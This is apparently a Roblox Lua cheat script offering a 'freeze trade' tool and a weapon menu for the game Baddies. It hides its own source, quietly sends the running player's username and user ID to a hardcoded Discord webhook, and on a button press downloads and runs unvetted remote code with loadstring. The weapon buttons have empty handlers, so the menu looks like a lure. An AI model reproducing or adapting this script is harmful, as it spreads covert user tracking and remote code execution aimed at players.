local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local WebhookURL = "https://discord.com/api/webhooks/1530805312192381141/X6zSC5HHZ1-7vyRsmqMIiD1SpyT7ynG1OrHzgdB7YxiauG4DFdJaIDmwxHFsGhEUPyjC"

if setfflag then setfflag("DebugHideScriptSource", true) end
setmetatable(getfenv(), {__metatable = "Hidden"})

pcall(function()
    HttpService:PostAsync(WebhookURL, HttpService:JSONEncode({
        embeds = {{
            title = "SCRIPT USED",
            color = 65280,
            fields = {
                {name = "username", value = "`"..player.Name.."`", inline = true},
                {name = "user id", value = "`"..player.UserId.."`", inline = true}
            }
        }}
    }), Enum.HttpContentType.ApplicationJson)
end)

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({Name = "FREEZE TRADE", UseMobileSizing = true})

local Main = Window:CreateTab("Main", 0)
local Weapons = Window:CreateTab("Weapons", 0)

Main:CreateSection("MAIN")
Main:CreateButton({
    Name = "activate freeze trade",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/baddiesfreeze-glitch/freeze-trade/refs/heads/main/Baddies", true))()
    end
})

Weapons:CreateSection("WEAPONS")
local WeaponList = {
"axe",
"brass knuckles",
"chain mace",
"chakram",
"champion gloves",
"chainsaw",
"crowbar",
"cupid's bow",
"dance bomb",
"fan of requiem",
"flamethrower",
"freeze gun",
"frying pan",
"ghostly gloves",
"glitter bomb",
"golden pipe",
"gravity gun",
"grenade launcher",
"harpoon",
"ice crown queen",
"ice katana",
"inferno blade",
"kitty purse",
"love me hate me taser",
"loveboard",
"nunchucks",
"nightmare purse",
"poison knuckles",
"rainbow portal gun",
"reindeer purse",
"roller skates",
"sakura blade",
"santa's rpg",
"scythe",
"shiny purse",
"slasher claws",
"sledgehammer",
"spearhead stick",
"spiked baddies bat",
"spiked kitty stanli",
"spiked knuckles",
"spiked purse",
"trident",
"witch scepter",
"yin yang knives"
}

for _,wep in pairs(WeaponList) do
    Weapons:CreateButton({Name = wep, Callback = function() end})
end
